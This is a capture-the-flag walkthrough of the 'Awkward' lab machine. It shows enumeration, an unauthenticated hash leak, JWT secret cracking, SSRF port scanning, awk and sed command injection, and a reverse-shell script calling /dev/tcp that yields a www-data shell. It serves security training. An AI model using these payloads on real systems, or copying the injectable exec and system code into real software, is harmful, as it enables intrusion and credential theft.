![awkward.png](awkward.png)

# Awkward

## Enum

```
nmap -sC -sV 10.10.11.185 -oN scans/nmap.init
ial
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-30 08:56 GMT
Nmap scan report for 10.10.11.185
Host is up (0.035s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 72:54:af:ba:f6:e2:83:59:41:b7:cd:61:1c:2f:41:8b (ECDSA)
|_  256 59:36:5b:ba:3c:78:21:e3:26:b3:7d:23:60:5a:ec:38 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.55 seconds
```

Going to the webserver with the IP directly we get the domain name straight away
```bash
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 30 Oct 2022 08:59:11 GMT
Content-Type: text/html
Last-Modified: Thu, 15 Sep 2022 12:33:07 GMT
Connection: close
ETag: W/"63231b83-84"
Content-Length: 132

<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Refresh" content="0; url='http://hat-valley.htb'" />
</head>
<body>
</body>
</html>
```

So we're starting vhost enumeration in the background.  
looking at the website in the browser, I don't think it does anything of interest, except telling us that they have an online store in construction, and giving us employee names.
```bash
Christine Wool - CEO
Bean Hill - Sysadmin
Christopher Jones - Salesperson
Jackson Lightheart - Salesperson
```

We also note that the app sets a Cookie of "token: guest", maybe we can tamper with that later on. 

In the meantime host enumeration found one subdomain/vhost
```bash
 gobuster vhost -u hat-valley.htb -w /usr/share/seclists/Discovery/DNS/namelist.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://hat-valley.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/namelist.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/10/30 09:01:33 Starting gobuster in VHOST enumeration mode
===============================================================
Found: store.hat-valley.htb (Status: 401) [Size: 188]

===============================================================
2022/10/30 09:12:23 Finished
===============================================================
```

Going there from the browser it responds 401 and prompts for basic auth, where I attempted some very basic auth bypass without success
![basic-auth.png](basic-auth.png)


Recursive directory search finished on the main page 
```bash
dirsearch -u http://hat-valley.htb -r

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/blnkn/.dirsearch/reports/hat-valley.htb/_22-10-30_09-07-04.txt

Error Log: /home/blnkn/.dirsearch/logs/errors-22-10-30_09-07-04.log

Target: http://hat-valley.htb/

[09:07:04] Starting:
[09:07:05] 301 -  171B  - /js  ->  /js/     (Added to queue)
[09:07:24] 301 -  173B  - /css  ->  /css/     (Added to queue)
[09:07:26] 200 -    4KB - /favicon.ico
[09:07:29] 200 -    3KB - /index.html
[09:07:30] 200 -   14KB - /js/
[09:07:37] 500 -    2KB - /servlet/%C0%AE%C0%AE%C0%AF
[09:07:39] 301 -  179B  - /static  ->  /static/     (Added to queue)
[09:07:43] Starting: js/
[09:08:00] 200 -  150B  - /js/app
[09:08:03] 200 -  420KB - /js/app.js
[09:08:05] 200 -    8KB - /js/custom.js
[09:08:19] 500 -    2KB - /js/servlet/%C0%AE%C0%AE%C0%AF
[09:08:25] Starting: css/
[09:08:59] 500 -    2KB - /css/servlet/%C0%AE%C0%AE%C0%AF
[09:09:06] Starting: static/
[09:09:06] 301 -  185B  - /static/js  ->  /static/js/     (Added to queue)
[09:09:26] 301 -  187B  - /static/css  ->  /static/css/     (Added to queue)
[09:09:29] 301 -  191B  - /static/fonts  ->  /static/fonts/     (Added to queue)
[09:09:30] 301 -  193B  - /static/images  ->  /static/images/     (Added to queue)
[09:09:30] 200 -   11KB - /static/images/
[09:09:31] 200 -   11KB - /static/js/
[09:09:40] 500 -    2KB - /static/servlet/%C0%AE%C0%AE%C0%AF
[09:09:44] 200 -   11KB - /static/vendors/     (Added to queue)
[09:09:46] Starting: static/js/
[09:10:07] 200 -  163B  - /static/js/dashboard
[09:10:07] 200 -   10KB - /static/js/dashboard.js
[09:10:21] 500 -    2KB - /static/js/servlet/%C0%AE%C0%AE%C0%AF
[09:10:24] 200 -  162B  - /static/js/template
[09:10:27] Starting: static/css/
[09:10:56] 301 -  197B  - /static/css/maps  ->  /static/css/maps/     (Added to queue)
[09:11:03] 500 -    2KB - /static/css/servlet/%C0%AE%C0%AE%C0%AF
[09:11:08] Starting: static/fonts/
[09:11:44] 500 -    2KB - /static/fonts/servlet/%C0%AE%C0%AE%C0%AF
[09:11:51] Starting: static/images/
[09:12:08] 301 -  203B  - /static/images/auth  ->  /static/images/auth/     (Added to queue)
[09:12:08] 200 -    9KB - /static/images/auth/
[09:12:25] 500 -    2KB - /static/images/servlet/%C0%AE%C0%AE%C0%AF
[09:12:31] Starting: static/vendors/
[09:12:47] 301 -  205B  - /static/vendors/base  ->  /static/vendors/base/     (Added to queue)
[09:12:48] 200 -   12KB - /static/vendors/base/
[09:13:03] 500 -    2KB - /static/vendors/servlet/%C0%AE%C0%AE%C0%AF
[09:13:09] Starting: static/css/maps/
[09:13:41] 500 -    2KB - /static/css/maps/servlet/%C0%AE%C0%AE%C0%AF
[09:13:47] Starting: static/images/auth/
[09:14:19] 500 -    2KB - /static/images/auth/servlet/%C0%AE%C0%AE%C0%AF
[09:14:25] Starting: static/vendors/base/
[09:14:56] 500 -    2KB - /static/vendors/base/servlet/%C0%AE%C0%AE%C0%AF

Task Completed
```

Doing the same on the store vhost we find more paths, notably the README.md
```bash
dirsearch -u http://store.hat-valley.htb -r                                          130 ⨯

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/blnkn/.dirsearch/reports/store.hat-valley.htb/_22-10-30_09-25-08.txt

Error Log: /home/blnkn/.dirsearch/logs/errors-22-10-30_09-25-08.log

Target: http://store.hat-valley.htb/

[09:25:08] Starting:
[09:25:08] 301 -  178B  - /js  ->  http://store.hat-valley.htb/js/     (Added to queue)
[09:25:11] 200 -  918B  - /README.md
[09:25:17] 301 -  178B  - /cart  ->  http://store.hat-valley.htb/cart/     (Added to queue)
[09:25:18] 301 -  178B  - /css  ->  http://store.hat-valley.htb/css/     (Added to queue)
[09:25:20] 301 -  178B  - /fonts  ->  http://store.hat-valley.htb/fonts/     (Added to queue)
[09:25:21] 301 -  178B  - /img  ->  http://store.hat-valley.htb/img/     (Added to queue)
[09:25:21] 403 -  564B  - /js/
[09:25:28] 301 -  178B  - /static  ->  http://store.hat-valley.htb/static/     (Added to queue)
[09:25:32] Starting: js/
[09:25:55] Starting: cart/
[09:26:19] Starting: css/
[09:26:43] Starting: fonts/
[09:27:08] Starting: img/
[09:27:18] 403 -  564B  - /img/custom/     (Added to queue)
[09:27:31] Starting: static/
[09:27:32] 301 -  178B  - /static/js  ->  http://store.hat-valley.htb/static/js/     (Added to queue)
[09:27:41] 301 -  178B  - /static/css  ->  http://store.hat-valley.htb/static/css/     (Added to queue)
[09:27:43] 301 -  178B  - /static/fonts  ->  http://store.hat-valley.htb/static/fonts/     (Added to queue)
[09:27:43] 301 -  178B  - /static/images  ->  http://store.hat-valley.htb/static/images/     (Added to queue)
[09:27:43] 403 -  564B  - /static/images/
[09:27:44] 403 -  564B  - /static/js/
[09:27:54] Starting: img/custom/
[09:28:17] Starting: static/js/
[09:28:19] 200 -    8KB - /static/js/.DS_Store
[09:28:27] 200 -    9KB - /static/js/custom.js
[09:28:39] Starting: static/css/
[09:28:40] 200 -    8KB - /static/css/.DS_Store
[09:29:02] Starting: static/fonts/
[09:29:23] Starting: static/images/
[09:29:25] 200 -   10KB - /static/images/.DS_Store

Task Completed
```

That's what's in the readme
```bash
# Hat Valley - Shop Online!

### To Do
1. Waiting for SQL database to be setup, using offline files for now, will merge with database once it is setup
2. Implement checkout system, link with credit card system (Stripe??)
3. Implement shop filter
4. Get full catalogue of items

### How to Add New Catalogue Item
1. Copy an existing item from /product-details and paste it in the same folder, changing the name to reflect a new product ID
2. Change the fields to the appropriate values and save the file.
-- NOTE: Please leave the header on first line! This is used to verify it as a valid Hat Valley product. --

### Hat Valley Cart
Right now, the user's cart is stored within /cart, and is named according to the user's session ID. All products are appended to the same file for each user.
To test cart functionality, create a new cart file and add items to it, and see how they are reflected on the store website!
```

So, lets look at those product details 
```bash
dirsearch -u http://store.hat-valley.htb/product-details -r                          130 ⨯

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/blnkn/.dirsearch/reports/store.hat-valley.htb/-product-details_22-10-30_09-37-35.txt

Error Log: /home/blnkn/.dirsearch/logs/errors-22-10-30_09-37-35.log

Target: http://store.hat-valley.htb/product-details/

[09:37:35] Starting:
[09:37:37] 200 -   99B  - /product-details/1.txt
[09:37:37] 200 -   98B  - /product-details/2.txt

Task Completed
```

```bash
 curl http://store.hat-valley.htb/product-details/1.txt
***Hat Valley Product***
item_id=1&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
```
```bash
curl http://store.hat-valley.htb/product-details/2.txt
***Hat Valley Product***
item_id=2&item_name=Palm Tree Cap&item_brand=Kool Kats&item_price=$48.50
```

## Bruteforcing
Maybe we can try to bruteforce the basic auth since we know the names of some of the people involved in the company.        

That's a bit of a long shot but I want to experiment with bruteforcing tools

```
cat users.txt
admin
sales
guest
cwool
bhill
cjones
jlightheart
christine
bean
christopher
jackson
```

Passing the requests through burp, just to make sure this actually works like I think it does, I didn't get any luck with that though  
```bash
export HYDRA_PROXY_HTTP=http://localhost:8080
hydra -L users.txt -P /usr/share/seclists/Passwords/probable-v2-top1575.txt -f store.hat-valley.htb http-get / -V
```

Also trying patator
```bash
patator http_fuzz auth_type=basic url=store.hat-valley.htb user_pass=FILE0:FILE1 0=users.txt 1=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt -x ignore:code=401
```

## DS Store files

Downloading the DS Store files, and running them through an online decoder to get the content of the directory, we can get a better idea of the directory contents, here is the content of the js/ folder 
```
bootstrap.bundle.js
bootstrap.bundle.js.map
bootstrap.bundle.min.js
bootstrap.bundle.min.js.map
bootstrap.js
bootstrap.js.map
bootstrap.min.js
bootstrap.min.js.map
custom.js
jquery-3.0.0.min.js
jquery.mCustomScrollbar.concat.min.js
jquery.min.js
jquery.validate.js
modernizer.js
plugin.js
popper.min.js
revolution
revolution
revolution
slider-setting.js
```


## Token validation

Looking at the source in webpack, it looks like the router just looks if the cookie has token == guest.  
If not no further validation is done, it just needs to not be guest.
```js
router.beforeEach((to, from, next) => {
  if((to.name == 'leave' || to.name == 'dashboard') && VueCookieNext.getCookie('token') == 'guest') { //if user not logged in, redirect to login
    next({ name: 'hr' })
  }
  else if(to.name == 'hr' && VueCookieNext.getCookie('token') != 'guest') { //if user logged in, skip past login to dashboard
    next({ name: 'dashboard' })
  }
  else {
    next()
  }
})
```

So we oblige by setting the cookie to token == whatever and get to a dashboard.  
The dashboards has website metrics, and a feature that checks if the online store is up, and a section called staff details, that is empty for this user. 
There's also a separate page with a feature for employees to post leave requests.


Looking at the webpack, we find client side code to fetch staff details from the api:
```js
import axios from 'axios'
axios.defaults.withCredentials = true
const baseURL = "/api/"

const staff_details = () => {
    return axios.get(baseURL + 'staff-details')
        .then(response => response.data)
}

export default {
    staff_details
}
```

So we can start hitting that endpoint to see what happens:  
apparently the api endpoint itself doesn't even need any kind of auth
```bash
curl -s "http://hat-valley.htb/api/staff-details" | jq .
```
```json
[
  {
    "user_id": 1,
    "username": "christine.wool",
    "password": "6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649",
    "fullname": "Christine Wool",
    "role": "Founder, CEO",
    "phone": "0415202922"
  },
  {
    "user_id": 2,
    "username": "christopher.jones",
    "password": "e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1",
    "fullname": "Christopher Jones",
    "role": "Salesperson",
    "phone": "0456980001"
  },
  {
    "user_id": 3,
    "username": "jackson.lightheart",
    "password": "b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436",
    "fullname": "Jackson Lightheart",
    "role": "Salesperson",
    "phone": "0419444111"
  },
  {
    "user_id": 4,
    "username": "bean.hill",
    "password": "37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f",
    "fullname": "Bean Hill",
    "role": "System Administrator",
    "phone": "0432339177"
  }
]
```

and christopher's password can be easily cracked: 
```
christopher.jones:chris123
```

So now we can log in to the app as Christopher and we get a valid signed jwt as him.  
```python
import sys
from jwt.utils import base64url_decode
from binascii import hexlify


def jwt2john(jwt):
    """
    Convert signature from base64 to hex, and separate it from the data by a #
    so that John can parse it.
    """
    jwt_bytes = jwt.encode('ascii')
    parts = jwt_bytes.split(b'.')

    data = parts[0] + b'.' + parts[1]
    signature = hexlify(base64url_decode(parts[2]))

    return (data + b'#' + signature).decode('ascii')


if __name__ == "__main__":
    if len(sys.argv) != 2
        print("Usage: %s JWT" % sys.argv[0])
    else:
        john = jwt2john(sys.argv[1])
        print(john)
```


We can use this jwt2john script to crack the password that this jwt was signed with
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt chris-jwt.txt
john hash.txt --show --format=Raw-SHA256
?:123beany123

1 password hash cracked, 3 left
```

Tried to log in with those creds to the main app, the store app on the vhost, and over ssh, no success so far.

Presumably the store is up thing reaches the store through the internal network to check if it's up. So maybe we can leverage this as an SSRF, looking at the source in webpack again:
```js
import axios from 'axios'
axios.defaults.withCredentials = true
const baseURL = "/api/"

const store_status = (URL) => {
    const params = {
        url: {toJSON: () => URL}
    }
    return axios.get(baseURL + 'store-status', {params})
        .then(response => response.data)
}

export default {
    store_status
```

And indeed this can be used as a SSRF:
```bash
curl -i 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1"'
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 15 Jan 2023 09:00:54 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 132
Connection: keep-alive
x-powered-by: Express
access-control-allow-origin: *
etag: W/"84-P/5ob00JvOzx20G7pf2GChzepTg"

<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Refresh" content="0; url='http://hat-valley.htb'" />
</head>
<body>
</body>
</html>
```

So we can leverage this to fuzz for open ports from behind the firewall
```
ffuf \
  -w /usr/share/seclists/Discovery/Web-Content/local-ports.txt \
  -u 'http://hat-valley.htb/api/store-status?url="http://FUZZ"' \
  -x http://127.0.0.1:8080 \
  -fs 0

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.5.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://hat-valley.htb/api/store-status?url="http://FUZZ"
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/local-ports.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Proxy            : http://127.0.0.1:8080
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

127.0.0.1:80            [Status: 200, Size: 132, Words: 6, Lines: 9, Duration: 326ms]
127.0.0.1:3002          [Status: 200, Size: 77010, Words: 5916, Lines: 686, Duration: 288ms]
127.0.0.1:8080          [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 252ms]
```

8080 doesn't seem very interesting, and I'm not entirely sure what it is but 3002 is some kind of documentation page, and it gives us the server side js code for the features we saw from the client side so far.

In submit-leave feature's code, the const finalEntry is passed to an exec() and we control the variables that it's made of, and it's then expanded into a system command with echo

In all-leave same concept but potentially more interesting because that's an awk command, and awk is a GTFO bin, and the way the command is constructed seems pretty close to an awk command we could use for arbitrary file read, see the js:
```js
app.get('/api/all-leave', (req, res) => {
  const user_token = req.cookies.token
  var authFailed = false
  var user = null
  if(user_token) {
    const decodedToken = jwt.verify(user_token, TOKEN_SECRET)
    if(!decodedToken.username) {
      authFailed = true
    }
    else {
      user = decodedToken.username
    }
  }
  if(authFailed) {
    return res.status(401).json({Error: "Invalid Token"})
  }
  if(!user) {
    return res.status(500).send("Invalid user")
  }
  const bad = [";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"]
  const badInUser = bad.some(char => user.includes(char));
  if(badInUser) {
    return res.status(500).send("Bad character detected.")
  }
  exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {
    if(stdout) {
      return res.status(200).send(new Buffer(stdout, 'binary'));
    }
    if (error) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
    if (stderr) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
  })
}) 
``` 

And the arbitrary file read with awk: 
```bash
awk '//' /etc/passwd
``` 

So the following could work I think:
```js
const user == "/' /etc/passwd '"
exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {
    if(stdout) {
      return res.status(200).send(new Buffer(stdout, 'binary'));
    }
    if (error) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
    if (stderr) {
      return res.status(500).send("Failed to retrieve leave requests")
    }
  })
})
``` 

We can do this because we control the user variable since we know the secret to sign the JWTs.  
![jwt-sign.png](jwt-sign.png)  

which means that we now have LFI on the box
```bash
curl -i 'http://hat-valley.htb/api/all-leave' -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2NzM3MjAyNTd9.hMapu1pjAQ31z6-DnWiUe42dU5LhfxrafWVcNyoZYps'
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 15 Jan 2023 14:05:12 GMT
Content-Type: application/octet-stream
Content-Length: 3059
Connection: keep-alive
x-powered-by: Express
access-control-allow-origin: *
etag: W/"bf3-PdFG97gBjwRp4RtnVyUN3af1LtA"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:115::/run/uuidd:/usr/sbin/nologin
systemd-oom:x:108:116:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin
tcpdump:x:109:117::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
avahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
rtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin
whoopsie:x:117:124::/nonexistent:/bin/false
sssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
nm-openvpn:x:120:126:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
saned:x:121:128::/var/lib/saned:/usr/sbin/nologin
colord:x:122:129:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:123:130::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:124:131:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:125:65534::/run/gnome-initial-setup/:/bin/false
hplip:x:126:7:HPLIP system user,,,:/run/hplip:/bin/false
gdm:x:127:133:Gnome Display Manager:/var/lib/gdm3:/bin/false
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash
ostfix:x:128:136::/var/spool/postfix:/usr/sbin/nologin
mysql:x:129:138:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:130:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:999:999::/var/log/laurel:/bin/false
```

we know bean is the admin and christine the ceo
```bash
grep sh$ passwd
root:x:0:0:root:/root:/bin/bash
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash
```

Naturaly we can try to pull the ssh private keys for those 2, but no luck.  
reading a bunch of the usual files, we end up reading the bashrc.   
There's a command alias for a backup script:
```bash
# custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'
```

So we're pulling that out:
```bash
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date > /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp
```

Now we know where to pull that backup from.  
So after extracting the archive we can start looting around in the home folder of bean.  
Xpad sounds like it could be some kind of a notepad app, and it is indeed.  
Looks like bean also used that password for his user account on the box. 
Which means we get a shell over ssh.
```bash
pwd
/home/blnkn/sec/htb/machines/awkward/loot/bean/.config/xpad
cat content-DS1ZS1
TO DO:
- Get real hat prices / stock from Christine
- Implement more secure hashing mechanism for HR system
- Setup better confirmation message when adding item to cart
- Add support for item quantity > 1
- Implement checkout system

boldHR SYSTEM/bold
bean.hill
014mrbeanrules!#P

https://www.slac.stanford.edu/slac/www/resource/how-to-use/cgi-rexx/cgi-esc.html

boldMAKE SURE TO USE THIS EVERYWHERE ^^^/bold
```

## Privesc

Now that we have shell as bean, remember the store vhost? it was using basic auth, so we should be able to find the password in the nginx htpasswd file if bean has access: 
```
cat /etc/nginx/conf.d/.htpasswd
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
```
According to [Apache's docs](https://httpd.apache.org/docs/current/misc/password_encryptions.html) this may not be easily crackable.

But in the readme file Bean seems to say that it's his password for the store app, he didn't lie this combo works on the store webapp:
```
admin:014mrbeanrules!#P
```

Bean also has access to the source code for that store web app, so after reading through this and playing with the webapp, the code to delete from cart seems vulnerable to command injection again:
```php
//delete from cart
if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST['user']) {
    $item_id = $_POST['item'];
    $user_id = $_POST['user'];
    $bad_chars = array(";","&","|",">","<","*","?","`","$","(",")","{","}","[","]","!","#"); //no hacking allowed!!

    foreach($bad_chars as $bad) {
        if(strpos($item_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }

    foreach($bad_chars as $bad) {
        if(strpos($user_id, $bad) !== FALSE) {
            echo "Bad character detected!";
            exit;
        }
    }
    if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
        echo "Item removed from cart";
    }
    else {
        echo "Invalid item";
    }
    exit;
```

Because it uses sed, sed is a GTFO bin and we control some variables in that expression, we could drop a very simple revshell in /tmp
```bash
-bash-5.1$ vi blah.sh
-bash-5.1$ chmod +x blah.sh
-bash-5.1$ cat blah.sh
#!/bin/bash
sh -i >& /dev/tcp/10.10.14.135/4242 0>&1
```

And then have sed call it with something like that
```bash
sed '1e/tmp/blah.sh' /etc/passwd
sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}
sed -i '/item_id=1' -e "1e/tmp/blah.sh" /tmp/blah.sh '/d' /var/www/store/cart/user_id
```

so this means that the `item_id` needs to be `1' -e "1e/tmp/blah.sh" /tmp/blah.sh '` lets go put whatever in the cart and intercept the post to remove it, and we can slap our payload in there with some urlencoding:  
![delete.png](delete.png)

And ... disappointingly we get an `Invalid item` error, but that's not a big deal we have the source, lets have a closer look.
```php
    if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
        system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
        echo "Item removed from cart";
    }
    else {
        echo "Invalid item";
    }
```

So this happens because our sketchy item id needs be present in the cart file for our user, and it's not, we only have a normal item id in there, e.g '1'. but in theory it would have worked if that was the case, so can we control what gets written to that file? Yes we can:
```php
    if(checkValidItem("{$STORE_HOME}product-details/{$item_id}.txt")) {
        if(!file_exists("{$STORE_HOME}cart/{$user_id}")) {
            system("echo '***Hat Valley Cart***' > {$STORE_HOME}cart/{$user_id}");
        }
        system("head -2 {$STORE_HOME}product-details/{$item_id}.txt | tail -1 >> {$STORE_HOME}cart/{$user_id}");
        echo "Item added successfully!";
    }
    else {
        echo "Invalid item";
    }
}
```

Looking at the code for the add to cart, it takes the item id from our payload and copies the content of the filename corresponding to the item id we provided, those files are in `/var/www/store/product-details` and we have write access in there, so let's go write a new product id file add id 4 for instance, and put our sketchy item id in there:
```bash
-bash-5.1$ pwd
/var/www/store/product-details
-bash-5.1$ ls -la
total 20
drwxrwxrwx 2 root root 4096 Jan 16 04:00 .
drwxr-xr-x 9 root root 4096 Oct  6 01:35 ..
-rw-r--r-- 1 root root   99 Jan 16 04:00 1.txt
-rw-r--r-- 1 root root   98 Jan 16 04:00 2.txt
-rw-r--r-- 1 root root   97 Jan 16 04:00 3.txt
-bash-5.1$ cp 3.txt 4.txt
-bash-5.1$ vi 4.txt
-bash-5.1$ cat 4.txt
***Hat Valley Product***
item_id=1' -e "1e/tmp/blah.sh" /tmp/blah.sh '&item_name=Straw Hat&item_brand=Sunny Summer&item_price=$70.00
```

Now we can intercept a cart add and substitute the real item id with our newly created file number, 4 in this case  
![sketchy.png](sketchy.png)  

Now the correct item id has been copied to our user's cart
```bash
-bash-5.1$ cat    5ce3-9484-af5-1edd
***Hat Valley Cart***
item_id=1&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
item_id=1' -e "1e/tmp/blah.sh" /tmp/blah.sh '&item_name=Straw Hat&item_brand=Sunny Summer&item_price=$70.00
```

Let's not forget to have a listener to catch that shell and lets try the delete again.
```
rlwrap nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.10.14.135] from (UNKNOWN) [10.10.11.185] 58778
sh: 0: can't access tty; job control turned off
$                       id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$
```

Now we have a shell as www-data so we can access that /var/www/private folder that wasn't readable by bean
```
$ pwd
/var/www/store
$ cd ..
$ ls -la
total 28
drwxr-xr-x  7 root      root     4096 Oct  6 01:35 .
drwxr-xr-x 15 root      root     4096 Oct  6 01:35 ..
drw-rwx---  5 root      www-data 4096 Jan 15 19:13 .pm2
drwxr-xr-x  6 root      root     4096 Oct  6 01:35 hat-valley.htb
drwxr-xr-x  2 root      root     4096 Oct  6 01:35 html
dr-xr-x---  2 christine www-data 4096 Oct  6 01:35 private
drwxr-xr-x  9 root      root     4096 Oct  6 01:35 store
$ cd private
$ ls -la
total 12
dr-xr-x--- 2 christine www-data 4096 Oct  6 01:35 .
drwxr-xr-x 7 root      root     4096 Oct  6 01:35 ..
-rwxrwxrwx 1 christine www-data  600 Jan 16 04:10 leave_requests.csv
$ cat leave_requests.csv
Leave Request Database,,,,
,,,,
